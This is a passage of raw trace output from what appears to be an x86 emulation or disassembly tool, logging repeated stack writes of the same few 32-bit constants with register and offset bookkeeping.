0x11f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91f4 for stack size 0x10084 saving data to stack: 896093928 4 0x4615b8: mov dword ptr [esp + 0x11f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91f8 for stack size 0x10088 saving data to stack: 929680980 4 0x4615c3: mov dword ptr [esp + 0x11fc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91fc for stack size 0x1008c saving data to stack: 1389027477 4 0x4615ce: mov dword ptr [esp + 0x1200], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9200 for stack size 0x10090 saving data to stack: 914789047 4 0x4615d9: mov dword ptr [esp + 0x1204], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9204 for stack size 0x10094 saving data to stack: 896093928 4 0x4615e4: mov dword ptr [esp + 0x1208], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9208 for stack size 0x10098 saving data to stack: 929680980 4 0x4615ef: mov dword ptr [esp + 0x120c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x920c for stack size 0x1009c saving data to stack: 1389027477 4 0x4615fa: mov dword ptr [esp + 0x1210], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9210 for stack size 0x100a0 saving data to stack: 914789047 4 0x461605: mov dword ptr [esp + 0x1214], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9214 for stack size 0x100a4 saving data to stack: 896093928 4 0x461610: mov dword ptr [esp + 0x1218], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9218 for stack size 0x100a8 saving data to stack: 929680980 4 0x46161b: mov dword ptr [esp + 0x121c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x921c for stack size 0x100ac saving data to stack: 1389027477 4 0x461626: mov dword ptr [esp + 0x1220], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9220 for stack size 0x100b0 saving data to stack: 914789047 4 0x461631: mov dword ptr [esp + 0x1224], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9224 for stack size 0x100b4 saving data to stack: 896093928 4 0x46163c: mov dword ptr [esp + 0x1228], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9228 for stack size 0x100b8 saving data to stack: 929680980 4 0x461647: mov dword ptr [esp + 0x122c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x922c for stack size 0x100bc saving data to stack: 1389027477 4 0x461652: mov dword ptr [esp + 0x1230], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9230 for stack size 0x100c0 saving data to stack: 914789047 4 0x46165d: mov dword ptr [esp + 0x1234], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9234 for stack size 0x100c4 saving data to stack: 896093928 4 0x461668: mov dword ptr [esp + 0x1238], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9238 for stack size 0x100c8 saving data to stack: 929680980 4 0x461673: mov dword ptr [esp + 0x123c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x923c for stack size 0x100cc saving data to stack: 1389027477 4 0x46167e: mov dword ptr [esp + 0x1240], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9240 for stack size 0x100d0 saving data to stack: 914789047 4 0x461689: mov dword ptr [esp + 0x1244], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9244 for stack size 0x100d4 saving data to stack: 896093928 4 0x461694: mov dword ptr [esp + 0x1248], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9248 for stack size 0x100d8 saving data to stack: 929680980 4 0x46169f: mov dword ptr [esp + 0x124c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x924c for stack size 0x100dc saving data to stack: 1389027477 4 0x4616aa: mov dword ptr [esp + 0x1250], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9250 for stack size 0x100e0 saving data to stack: 914789047 4 0x4616b5: mov dword ptr [esp + 0x1254], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9254 for stack size 0x100e4 saving data to stack: 896093928 4 0x4616c0: mov dword ptr [esp + 0x1258], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9258 for stack size 0x100e8 saving data to stack: 929680980 4 0x4616cb: mov dword ptr [esp + 0x125c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x925c for stack size 0x100ec saving data to stack: 1389027477 4 0x4616d6: mov dword ptr [esp + 0x1260], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9260 for stack size 0x100f0 saving data to stack: 914789047 4 0x4616e1: mov dword ptr [esp + 0x1264], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9264 for stack size 0x100f4 saving data to stack: 896093928 4 0x4616ec: mov dword ptr [esp + 0x1268], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9268 for stack size 0x100f8 saving data to stack: 929680980 4 0x4616f7: mov dword ptr [esp + 0x126c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x926c for stack size 0x100fc saving data to stack: 1389027477 4 0x461702: mov dword ptr [esp + 0x1270], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9270 for stack size 0x10100 saving data to stack: 914789047 4 0x46170d: mov dword ptr [esp + 0x1274], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9274 for stack size 0x10104 saving data to stack: 896093928 4 0x461718: mov dword ptr [esp + 0x1278], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9278 for stack size 0x10108 saving data to stack: 929680980 4 0x461723: mov dword ptr [esp + 0x127c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x927c for stack size 0x1010c saving data to stack: 1389027477 4 0x46172e: mov dword ptr [esp + 0x1280], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9280 for stack size 0x10110 saving data to stack: 914789047 4 0x461739: mov dword ptr [esp + 0x1284], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9284 for stack size 0x10114 saving data to stack: 896093928 4 0x461744: mov dword ptr [esp + 0x1288], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9288 for stack size 0x10118 saving data to stack: 929680980 4 0x46174f: mov dword ptr [esp + 0x128c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x928c for stack size 0x1011c saving data to stack: 1389027477 4 0x46175a: mov dword ptr [esp + 0x1290], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9290 for stack size 0x10120 saving data to stack: 914789047 4 0x461765: mov dword ptr [esp + 0x1294], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9294 for stack size 0x10124 saving data to stack: 896093928 4 0x461770: mov dword ptr [esp + 0x1298], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9298 for stack size 0x10128 saving data to stack: 929680980 4 0x46177b: mov dword ptr [esp + 0x129c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x929c for stack size 0x1012c saving data to stack: 1389027477 4 0x461786: mov dword ptr [esp + 0x12a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92a0 for stack size 0x10130 saving data to stack: 914789047 4 0x461791: mov dword ptr [esp + 0x12a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92a4 for stack size 0x10134 saving data to stack: 896093928 4 0x46179c: mov dword ptr [esp + 0x12a8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92a8 for stack size 0x10138 saving data to stack: 929680980 4 0x4617a7: mov dword ptr [esp + 0x12ac], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92ac for stack size 0x1013c saving data to stack: 1389027477 4 0x4617b2: mov dword ptr [esp + 0x1540], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9540 for stack size 0x10140 saving data to stack: 914789047 4 0x4617bd: mov dword ptr [esp + 0x1544], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9544 for stack size 0x10144 saving data to stack: 896093928 4 0x4617c8: mov dword ptr [esp + 0x1548], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9548 for stack size 0x10148 saving data to stack: 929680980 4 0x4617d3: mov dword ptr [esp + 0x154c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x954c for stack size 0x1014c saving data to stack: 1389027477 4 0x4617de: mov dword ptr [esp + 0x1550], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9550 for stack size 0x10150 saving data to stack: 1913178889 4 0x4617e9: mov dword ptr [esp + 0x1554], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9554 for stack size 0x10154 saving data to stack: 2231344414 4 0x4617f0: mov dword ptr [esp + 0x1558], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9558 for stack size 0x10158 saving data to stack: 586689126 4 0x4617f7: mov dword ptr [esp + 0x155c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x955c for stack size 0x1015c saving data to stack: 1701587195 4 0x4617fe: mov dword ptr [esp + 0x12b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92b0 for stack size 0x10160 saving data to stack: 914789047 4 0x461809: mov dword ptr [esp + 0x12b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92b4 for stack size 0x10164 saving data to stack: 896093928 4 0x461814: mov dword ptr [esp + 0x12b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92b8 for stack size 0x10168 saving data to stack: 929680980 4 0x46181f: mov dword ptr [esp + 0x12bc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92bc for stack size 0x1016c saving data to stack: 1389027477 4 0x46182a: mov dword ptr [esp + 0x12c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92c0 for stack size 0x10170 saving data to stack: 914789047 4 0x461835: mov dword ptr [esp + 0x12c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92c4 for stack size 0x10174 saving data to stack: 896093928 4 0x461840: mov dword ptr [esp + 0x12c8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92c8 for stack size 0x10178 saving data to stack: 929680980 4 0x46184b: mov dword ptr [esp + 0x12cc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92cc for stack size 0x1017c saving data to stack: 1389027477 4 0x461856: mov dword ptr [esp + 0x12d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92d0 for stack size 0x10180 saving data to stack: 914789047 4 0x461861: mov dword ptr [esp + 0x12d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92d4 for stack size 0x10184 saving data to stack: 896093928 4 0x46186c: mov dword ptr [esp + 0x12d8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92d8 for stack size 0x10188 saving data to stack: 929680980 4 0x461877: mov dword ptr [esp + 0x12dc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92dc for stack size 0x1018c saving data to stack: 1389027477 4 0x461882: mov dword ptr [esp + 0x12e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92e0 for stack size 0x10190 saving data to stack: 914789047 4 0x46188d: mov dword ptr [esp + 0x12e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92e4 for stack size 0x10194 saving data to stack: 896093928 4 0x461898: mov dword ptr [esp + 0x12e8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92e8 for stack size 0x10198 saving data to stack: 929680980 4 0x4618a3: mov dword ptr [esp + 0x12ec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92ec for stack size 0x1019c saving data to stack: 1389027477 4 0x4618ae: mov dword ptr [esp + 0x12f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92f0 for stack size 0x101a0 saving data to stack: 914789047 4 0x4618b9: mov dword ptr [esp + 0x12f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92f4 for stack size 0x101a4 saving data to stack: 896093928 4 0x4618c4: mov dword ptr [esp + 0x12f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92f8 for stack size 0x101a8 saving data to stack: 929680980 4 0x4618cf: mov dword ptr [esp + 0x12fc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x92fc for stack size 0x101ac saving data to stack: 1389027477 4 0x4618da: mov dword ptr [esp + 0x1300], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9300 for stack size 0x101b0 saving data to stack: 914789047 4 0x4618e5: mov dword ptr [esp + 0x1304], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9304 for stack size 0x101b4 saving data to stack: 896093928 4 0x4618f0: mov dword ptr [esp + 0x1308], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9308 for stack size 0x101b8 saving data to stack: 929680980 4 0x4618fb: mov dword ptr [esp + 0x130c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x930c for stack size 0x101bc saving data to stack: 1389027477 4 0x461906: mov dword ptr [esp + 0x1310], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9310 for stack size 0x101c0 saving data to stack: 914789047 4 0x461911: mov dword ptr [esp + 0x1314], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9314 for stack size 0x101c4 saving data to stack: 896093928 4 0x46191c: mov dword ptr [esp + 0x1318], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9318 for stack size 0x101c8 saving data to stack: 929680980 4 0x461927: mov dword ptr [esp + 0x131c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x931c for stack size 0x101cc saving data to stack: 1389027477 4 0x461932: mov dword ptr [esp + 0x1560], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9560 for stack size 0x101d0 saving data to stack: 914789047 4 0x46193d: mov dword ptr [esp + 0x1564], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9564 for stack size 0x101d4 saving data to stack: 896093928 4 0x461948: mov dword ptr [esp + 0x1568], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9568 for stack size 0x101d8 saving data to stack: 929680980 4 0x461953: mov dword ptr [esp + 0x156c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x956c for stack size 0x101dc saving data to stack: 1389027477 4 0x46195e: mov dword ptr [esp + 0x1570], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9570 for stack size 0x101e0 saving data to stack: 1913178889 4 0x461969: mov dword ptr [esp + 0x1574], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9574 for stack size 0x101e4 saving data to stack: 2231344414 4 0x461970: mov dword ptr [esp + 0x1578], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9578 for stack size 0x101e8 saving data to stack: 586689126 4 0x461977: mov dword ptr [esp + 0x157c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x957c for stack size 0x101ec saving data to stack: 1701587195 4 0x46197e: mov dword ptr [esp + 0x1320], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9320 for stack size 0x101f0 saving data to stack: 914789047 4 0x461989: mov dword ptr [esp + 0x1324], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9324 for stack size 0x101f4 saving data to stack: 896093928 4 0x461994: mov dword ptr [esp + 0x1328], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9328 for stack size 0x101f8 saving data to stack: 929680980 4 0x46199f: mov dword ptr [esp + 0x132c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x932c for stack size 0x101fc saving data to stack: 1389027477 4 0x4619aa: mov dword ptr [esp + 0x1330], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9330 for stack size 0x10200 saving data to stack: 914789047 4 0x4619b5: mov dword ptr [esp + 0x1334], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9334 for stack size 0x10204 saving data to stack: 896093928 4 0x4619c0: mov dword ptr [esp + 0x1338], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9338 for stack size 0x10208 saving data to stack: 929680980 4 0x4619cb: mov dword ptr [esp + 0x133c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x933c for stack size 0x1020c saving data to stack: 1389027477 4 0x4619d6: mov dword ptr [esp + 0x1340], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9340 for stack size 0x10210 saving data to stack: 914789047 4 0x4619e1: mov dword ptr [esp + 0x1344], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9344 for stack size 0x10214 saving data to stack: 896093928 4 0x4619ec: mov dword ptr [esp + 0x1348], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9348 for stack size 0x10218 saving data to stack: 929680980 4 0x4619f7: mov dword ptr [esp + 0x134c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x934c for stack size 0x1021c saving data to stack: 1389027477 4 0x461a02: mov dword ptr [esp + 0x1350], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9350 for stack size 0x10220 saving data to stack: 914789047 4 0x461a0d: mov dword ptr [esp + 0x1354], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9354 for stack size 0x10224 saving data to stack: 896093928 4 0x461a18: mov dword ptr [esp + 0x1358], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9358 for stack size 0x10228 saving data to stack: 929680980 4 0x461a23: mov dword ptr [esp + 0x135c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x935c for stack size 0x1022c saving data to stack: 1389027477 4 0x461a2e: mov dword ptr [esp + 0x1360], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9360 for stack size 0x10230 saving data to stack: 914789047 4 0x461a39: mov dword ptr [esp + 0x1364], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9364 for stack size 0x10234 saving data to stack: 896093928 4 0x461a44: mov dword ptr [esp + 0x1368], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9368 for stack size 0x10238 saving data to stack: 929680980 4 0x461a4f: mov dword ptr [esp + 0x136c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x936c for stack size 0x1023c saving data to stack: 1389027477 4 0x461a5a: mov dword ptr [esp + 0x1370], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9370 for stack size 0x10240 saving data to stack: 914789047 4 0x461a65: mov dword ptr [esp + 0x1374], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9374 for stack size 0x10244 saving data to stack: 896093928 4 0x461a70: mov dword ptr [esp + 0x1378], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9378 for stack size 0x10248 saving data to stack: 929680980 4 0x461a7b: mov dword ptr [esp + 0x137c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x937c for stack size 0x1024c saving data to stack: 1389027477 4 0x461a86: mov dword ptr [esp + 0x13a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93a0 for stack size 0x10250 saving data to stack: 914789047 4 0x461a91: mov dword ptr [esp + 0x13a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93a4 for stack size 0x10254 saving data to stack: 896093928 4 0x461a9c: mov dword ptr [esp + 0x13a8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93a8 for stack size 0x10258 saving data to stack: 929680980 4 0x461aa7: mov dword ptr [esp + 0x13ac], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93ac for stack size 0x1025c saving data to stack: 1389027477 4 0x461ab2: mov dword ptr [esp + 0x13b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93b0 for stack size 0x10260 saving data to stack: 914789047 4 0x461abd: mov dword ptr [esp + 0x13b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93b4 for stack size 0x10264 saving data to stack: 896093928 4 0x461ac8: mov dword ptr [esp + 0x13b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93b8 for stack size 0x10268 saving data to stack: 929680980 4 0x461ad3: mov dword ptr [esp + 0x13bc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93bc for stack size 0x1026c saving data to stack: 1389027477 4 0x461ade: mov dword ptr [esp + 0x13c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93c0 for stack size 0x10270 saving data to stack: 914789047 4 0x461ae9: mov dword ptr [esp + 0x13c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93c4 for stack size 0x10274 saving data to stack: 896093928 4 0x461af4: mov dword ptr [esp + 0x13c8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93c8 for stack size 0x10278 saving data to stack: 929680980 4 0x461aff: mov dword ptr [esp + 0x13cc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93cc for stack size 0x1027c saving data to stack: 1389027477 4 0x461b0a: mov dword ptr [esp + 0x13d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93d0 for stack size 0x10280 saving data to stack: 914789047 4 0x461b15: mov dword ptr [esp + 0x13d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93d4 for stack size 0x10284 saving data to stack: 896093928 4 0x461b20: mov dword ptr [esp + 0x13d8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93d8 for stack size 0x10288 saving data to stack: 929680980 4 0x461b2b: mov dword ptr [esp + 0x13dc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93dc for stack size 0x1028c saving data to stack: 1389027477 4 0x461b36: mov dword ptr [esp + 0x13e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93e0 for stack size 0x10290 saving data to stack: 914789047 4 0x461b41: mov dword ptr [esp + 0x13e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93e4 for stack size 0x10294 saving data to stack: 896093928 4 0x461b4c: mov dword ptr [esp + 0x13e8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93e8 for stack size 0x10298 saving data to stack: 929680980 4 0x461b57: mov dword ptr [esp + 0x13ec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93ec for stack size 0x1029c saving data to stack: 1389027477 4 0x461b62: mov dword ptr [esp + 0x13f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93f0 for stack size 0x102a0 saving data to stack: 914789047 4 0x461b6d: mov dword ptr [esp + 0x13f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93f4 for stack size 0x102a4 saving data to stack: 896093928 4 0x461b78: mov dword ptr [esp + 0x13f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93f8 for stack size 0x102a8 saving data to stack: 929680980 4 0x461b83: mov dword ptr [esp + 0x13fc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x93fc for stack size 0x102ac saving data to stack: 1389027477 4 0x461b8e: mov dword ptr [esp + 0x1400], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9400 for stack size 0x102b0 saving data to stack: 914789047 4 0x461b99: mov dword ptr [esp + 0x1404], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9404 for stack size 0x102b4 saving data to stack: 896093928 4 0x461ba4: mov dword ptr [esp + 0x1408], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9408 for stack size 0x102b8 saving data to stack: 929680980 4 0x461baf: mov dword ptr [esp + 0x140c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x940c for stack size 0x102bc saving data to stack: 1389027477 4 0x461bba: mov dword ptr [esp + 0x1410], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9410 for stack size 0x102c0 saving data to stack: 914789047 4 0x461bc5: mov dword ptr [esp + 0x1414], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9414 for stack size 0x102c4 saving data to stack: 896093928 4 0x461bd0: mov dword ptr [esp + 0x1418], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9418 for stack size 0x102c8 saving data to stack: 929680980 4 0x461bdb: mov dword ptr [esp + 0x141c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x941c for stack size 0x102cc saving data to stack: 1389027477 4 0x461be6: mov dword ptr [esp + 0x1420], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9420 for stack size 0x102d0 saving data to stack: 914789047 4 0x461bf1: mov dword ptr [esp + 0x1424], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9424 for stack size 0x102d4 saving data to stack: 896093928 4 0x461bfc: mov dword ptr [esp + 0x1428], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9428 for stack size 0x102d8 saving data to stack: 929680980 4 0x461c07: mov dword ptr [esp + 0x142c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x942c for stack size 0x102dc saving data to stack: 1389027477 4 0x461c12: mov dword ptr [esp + 0x1430], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9430 for stack size 0x102e0 saving data to stack: 914789047 4 0x461c1d: mov dword ptr [esp + 0x1434], 